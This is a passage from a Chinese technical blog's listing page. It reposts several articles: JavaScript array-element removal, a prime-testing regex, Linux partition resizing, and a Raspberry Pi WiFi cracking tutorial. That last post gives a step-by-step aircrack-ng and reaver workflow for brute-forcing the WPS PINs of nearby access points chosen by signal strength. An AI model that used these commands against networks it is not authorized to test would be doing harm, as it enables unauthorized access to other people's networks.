<li>该方法IE5.5以后才支持<br>值得一提的是splice方法在删除数组元素的同时,还可以新增入数组元素<br>比如arr.splice(1,1,’d’,’e’),d,e两个元素就被加入数组arr了<br>结果数组变成arr:’a’,’d’,’e’,’c’</li>
</ul>
<p>外一篇：<br>　　JavaScript通过设置数组的length属性来截断数组是惟一一种缩短数组长度的方法.如果使用delete运算符来删除数组中元素,虽然那个元素变成未定义的,但是数组的length属性并不改变两种删除元素,数组长度也改变的方法.</p>
<p>　 /<em>
　 </em>　方法:<strong>Array.remove(dx)</strong><br>　 <em>　功能:删除数组元素.
　 </em>　参数:dx删除元素的下标.<br>　 <em>　返回:在原数组上修改数组
　 </em>/<br>　　<br>　//经常用的是通过遍历,重构数组.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.remove=<span class="function"><span class="keyword">function</span>(<span class="params">dx</span>)</span></span><br><span class="line"><span class="function">　</span>&#123;</span><br><span class="line">　　<span class="keyword">if</span>(<span class="built_in">isNaN</span>(dx)||dx&gt;<span class="keyword">this</span>.length)&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">　　<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,n=<span class="number">0</span>;i&lt;<span class="keyword">this</span>.length;i++)</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　<span class="keyword">if</span>(<span class="keyword">this</span>[i]!=<span class="keyword">this</span>[dx])</span><br><span class="line">　　　　&#123;</span><br><span class="line">　　　　　　<span class="keyword">this</span>[n++]=<span class="keyword">this</span>[i]</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="keyword">this</span>.length-=<span class="number">1</span></span><br><span class="line">　&#125;</span><br><span class="line">　a = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>];</span><br><span class="line">　alert(<span class="string">"elements: "</span>+a+<span class="string">"nLength: "</span>+a.length);</span><br><span class="line">　a.remove(<span class="number">0</span>); <span class="comment">//删除下标为0的元素</span></span><br><span class="line">　alert(<span class="string">"elements: "</span>+a+<span class="string">"nLength: "</span>+a.length);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">　 *　方法:Array.baoremove(dx)</span></span><br><span class="line"><span class="comment">　 *　功能:删除数组元素.</span></span><br><span class="line"><span class="comment">　 *　参数:dx删除元素的下标.</span></span><br><span class="line"><span class="comment">　 *　返回:在原数组上修改数组.</span></span><br><span class="line"><span class="comment">　 */</span></span><br><span class="line">　　</span><br><span class="line">　<span class="comment">//我们也可以用splice来实现.</span></span><br><span class="line">　　</span><br><span class="line">　<span class="built_in">Array</span>.prototype.baoremove = <span class="function"><span class="keyword">function</span>(<span class="params">dx</span>)</span></span><br><span class="line"><span class="function">　</span>&#123;</span><br><span class="line">　　<span class="keyword">if</span>(<span class="built_in">isNaN</span>(dx)||dx&gt;<span class="keyword">this</span>.length)&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">　　<span class="keyword">this</span>.splice(dx,<span class="number">1</span>);</span><br><span class="line">　&#125;</span><br><span class="line">　b = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>];</span><br><span class="line">　alert(<span class="string">"elements: "</span>+b+<span class="string">"nLength: "</span>+b.length);</span><br><span class="line">　b.baoremove(<span class="number">1</span>); <span class="comment">//删除下标为1的元素</span></span><br><span class="line">　alert(<span class="string">"elements: "</span>+b+<span class="string">"nLength: "</span>+b.length);</span><br></pre></td></tr></table></figure>
<p>　　我们知道，在IE5或更低的版本中，JavaScript的Array（数组）对象并未提供现成的删除数组元素的方法。在IE5.5+的版本中，虽然有splice方法，但是并不是删除某一项（或几项），而仅仅是将某一项（或几项）的值清除，也就是说该项仍然存在，数组的长度并没有改变。<br>　　事实上，我们可以自己为数组增加一个删除方法（注意，这里指的是将数组的某一项真正的从数组成员中移除）。或许你会想到用循环来为数组重新赋值，这样做当然可以，但效率很低。<br>　　下面我们介绍利用Array对象的两个方法slice、concat来自定义删除数组的方法。<br>　　具体代码如下，请注意里面的注释。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.del=<span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;　<span class="comment">//n表示第几项，从0开始算起。</span></span><br><span class="line"><span class="comment">//prototype为对象原型，注意这里为对象增加自定义方法的方法。</span></span><br><span class="line">　<span class="keyword">if</span>(n&lt;<span class="number">0</span>)　<span class="comment">//如果n&lt;0，则不进行任何操作。</span></span><br><span class="line">　　<span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">　<span class="keyword">else</span></span><br><span class="line">　　<span class="keyword">return</span> <span class="keyword">this</span>.slice(<span class="number">0</span>,n).concat(<span class="keyword">this</span>.slice(n+<span class="number">1</span>,<span class="keyword">this</span>.length));</span><br><span class="line">　　<span class="comment">/*</span></span><br><span class="line"><span class="comment">　　　concat方法：返回一个新数组，这个新数组是由两个或更多数组组合而成的。</span></span><br><span class="line"><span class="comment">　　　　　　　　　这里就是返回this.slice(0,n)/this.slice(n+1,this.length)</span></span><br><span class="line"><span class="comment">　　 　　　　　　组成的新数组，这中间，刚好少了第n项。</span></span><br><span class="line"><span class="comment">　　　slice方法： 返回一个数组的一段，两个参数，分别指定开始和结束的位置。</span></span><br><span class="line"><span class="comment">　　*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//我们来试一试这个自己增加的方法</span></span><br><span class="line"><span class="keyword">var</span> test=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">test=test.del(<span class="number">3</span>);　<span class="comment">//从0算起，这里也就是删除第4项。</span></span><br><span class="line">alert(test);</span><br></pre></td></tr></table></figure></p>
<p>这样，仅仅灵活运用了Array对象的两个方法，就实现了我们的要求。</p>
<p>转载自 <a href="http://www.cnblogs.com/qiantuwuliang/archive/2010/09/01/1814706.html" target="_blank" rel="noopener">http://www.cnblogs.com/qiantuwuliang/archive/2010/09/01/1814706.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/03/01/检查素数的正则表达式分享/"><span>检查素数的正则表达式分享</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/03/01/检查素数的正则表达式分享/" rel="bookmark">
        <time class="entry-date published" datetime="2015-03-01T02:27:15.000Z">
          2015-03-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>一般来说，我们会使用正规表达式来做字符串匹配，今天在网上浏览的时候，看到了有人用正则表达式来检查一个数字是否为素数（质数），让我非常感兴趣<br>这个正则表达式如图所示：<br><a href="/uploads/2015/03/regexpr-for-prime-number.jpg"><img src="/uploads/2015/03/regexpr-for-prime-number-300x30.jpg" alt="regexpr-for-prime-number"></a><br>检查素数与否的正则表达式<br>要使用这个正规则表达式，你需要把自然数转成多个1的字符串，如：2 要写成 “11”， 3 要写成 “111”, 17 要写成“11111111111111111”，这种工作使用一些脚本语言可以轻松的完成。<br>一开始我对这个表达式持怀疑态度，但仔细研究了一下这个表达式，发现是非常合理的，下面，让我带你来细细剖析一下是这个表达式的工作原理。<br>首先，我们看到这个表达式中有“|”，也就是说这个表达式可以分成两个部分：/^1?$/ 和 /^(11+?)\1+$/<br>第一部分：/^1?$/， 这个部分相信不用我多说了，其表示匹配“空串”以及字串中只有一个“1”的字符串。<br>第二部分：/^(11+?)\1+$/，这个部分是整个表达式的关键部分。其可以分成两个部分，(11+?) 和\1+$，前半部很简单了，匹配以“11”开头的并重复0或n个1的字符串，后面的部分意思是把前半部分作为一个字串去匹配还剩下的字符串1次或多次（这句话的意思是——剩余的字串的1的个数要是前面字串1个数的整数倍）。<br>可见这个正规则表达式是取非素数，要得到素数还得要对整个表达式求反。通过上面的分析，我们知道，第二部分是最重要的，对于第二部分，举几个例子，<br>示例一：判断自然数8。我们可以知道，8转成我们的格式就是“11111111”，对于(11+?)，其匹配了“11”，于是还剩下“111111”，而\1+$正好匹配了剩下的“111111”，因为，“11”这个模式在“111111”出现了三次，符合模式匹配，返回true。所以，匹配成功，于是这个数不是质数。<br>示例二：判断自然数11。转成我们需要的格式是“11111111111”（十一个1），对于(11+?)，其匹配了“11”（前两个1），还剩下“111111111”（九个1），而\1+$无法为“11”匹配那“九个1”，因为“11”这个模式并没有在“九个1”这个串中正好出现N次。于是，我们的正则表达式引擎会尝试下一种方法，先匹配“111”（前三个1），然后把“111”作为模式去匹配剩下的“11111111”（八个1），很明显，那“八个1”并没有匹配“三个1”多次。所以，引擎会继续向下尝试……直至尝试所有可能都无法匹配成功。所以11是素数。<br>通过示例二，我们可以得到这样的等价数算算法，正则表达式会匹配这若干个1中有没有出现“二个1”的整数倍，“三个1”的整数倍，“四个1”的整数倍……，而，这正好是我们需要的算素数的算法。现在大家明白了吧。<br>下面，我们用perl来使用这个正规则表达式不停地输出素数：（关于perl的语法我就不多说了，请注意表达式前的取反操作符）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e'$|++;(1 x$_)!~/^1?$|^(11+?)\1+$/&amp;&amp;print"$_ "while ++$_'</span><br></pre></td></tr></table></figure></p>
<p>另外，让我们来举一反三，根据上述的这种方法，我们甚至可以用正则表达式来求证某方式是否有解，如：<br>二元方程：17x + 12y = 51   判断其是否有解的正则表达式是：^(.<em>)\1{16}(.</em>)\2{11}$<br>三元方程：11x + 2y + 5z = 115 判断其是否有解的正则表达式是：^(.<em>)\1{10}(.</em>)\2{1}(.*)\3{4}$<br>大家不妨自己做做练习，为什么上述的两个正则表达式可以判断方程是否有解。如果无法参透其中的奥妙的话，你可以读读这篇<a href="http://blog.stevenlevithan.com/archives/algebra-with-regexes" target="_blank" rel="noopener">英文文章</a>。</p>
<p>转载自 <a href="http://www.jb51.net/article/27859.htm" target="_blank" rel="noopener">http://www.jb51.net/article/27859.htm</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/计算机技术/">计算机技术</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/02/22/Linux下用fdisk和resize2fs动态修改分区大小/"><span>Linux下用fdisk和resize2fs动态修改分区大小</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/02/22/Linux下用fdisk和resize2fs动态修改分区大小/" rel="bookmark">
        <time class="entry-date published" datetime="2015-02-21T20:55:55.000Z">
          2015-02-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>我的Archlinux发现root(/)分区不够用了，于是想把/home分区的空间腾出一些来，<br>原理：用resize2fs调整/home文件系统的大小，用fdisk调整分区的大小。<br>试验结果：由于开始不小心把/home(/dev/sda4)分区删掉了，所以没试验成功，于是用以下步骤扩大了root分区：</p>
<ol>
<li>fdisk把root（/dev/sda3）分区删除，注意删除前记录开始柱面号，具体命令：<br>fdisk /dev/sda ，p命令显示的Start列）</li>
<li>用同样的开始柱面号，建立（fdisk /），命令 n</li>
<li>再使用resize2fs重新修改分区的大小，命令：resize2fs /dev/sda3。</li>
<li>重启系统，出现挂载/home分区失败，按照提示：mount -o remount,rw /，同时删除/etc/fstab下的含有/home那一行。</li>
<li>再重启系统。<br>成功了！(以后可以试一下用lvm动态调整分区)</li>
</ol>
<p>转载自 <a href="http://blog.chinaunix.net/uid-8747186-id-3189880.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-8747186-id-3189880.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/杂七杂八/">杂七杂八</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/02/21/树莓派（raspberrypi）安装aircrack-ng,reaver及wifi破解教程/"><span>树莓派（raspberrypi）安装aircrack-ng,reaver及wifi破解教程</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/02/21/树莓派（raspberrypi）安装aircrack-ng,reaver及wifi破解教程/" rel="bookmark">
        <time class="entry-date published" datetime="2015-02-20T21:54:51.000Z">
          2015-02-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>这篇文章主要应百度贴吧水友的要求，特写了一个小教程。让pi变得更有意思。<br>这个无线破解和PC上的原理是一样的，只不过平台换到了PI上。PI主要就是省电，放在那里跑一个月也没事。</p>
<p>回到正题：</p>
<p><strong>硬件环境</strong><br>树莓派B+一个（我用的是debian环境）<br>PC一台（或其它设备直接操作PI就行）<br>无线网卡（能用就行，不过强大的无线网卡会事半功倍，我用的3070）</p>
<p><strong>安装依赖包</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion</span><br><span class="line">sudo apt-get install libnl-3-200 libnl-3-dev libnl-3-doc libnl-genl-3-dev libnl-genl-3-200</span><br></pre></td></tr></table></figure></p>
<p><strong>安装aircarck-ng</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng</span><br><span class="line">cd aircrack-ng/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p>
<p><strong>安装reaver</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz</span><br><span class="line">tar zxvf reaver-1.4.tar.gz</span><br><span class="line">cd reaver-1.4/src</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p>
<p>如果上面下载的地址被墙，试下这个地址：/uploads/2015/02/reaver-1.4.tar.gz<br>如果安装成功后，会有airmon-ng,airodump-ng,reaver等命令可用。</p>
<p><strong>破解教程</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlan0</span><br><span class="line">sudo airodump-ng mon0</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/02/1.png"><img src="/uploads/2015/02/1-300x215.png" alt="1"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng mon0</span><br></pre></td></tr></table></figure></p>
<p>根据上面的airodump搜索到的无线信号，然后可以挑信号强的进行破解（注意，要选择开了WPS功能的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/02/2.png"><img src="/uploads/2015/02/2-300x69.png" alt="2"></a><br>如果想挂机破解，记得加上nohup命令后，可以断开ssh。然后剩下就是等待。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi &amp;</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/02/2-2.png"><img src="/uploads/2015/02/2-2-300x73.png" alt="2-2"></a><br>如果破解成功后，打开输出的日志，就可以看到reaver出来的密码。<br><a href="/uploads/2015/02/3.png"><img src="/uploads/2015/02/3-300x96.png" alt="3"></a></p>
<p>转载自 <a href="http://lok.me/a/1972.html" target="_blank" rel="noopener">http://lok.me/a/1972.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/树莓派/">树莓派</a>
    </span>
    

    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/7/" class="pagination-prev">上一页</a>
  
  
  <a href="/page/9/" class="pagination-next">下一页</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2018 403 Forbidden
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>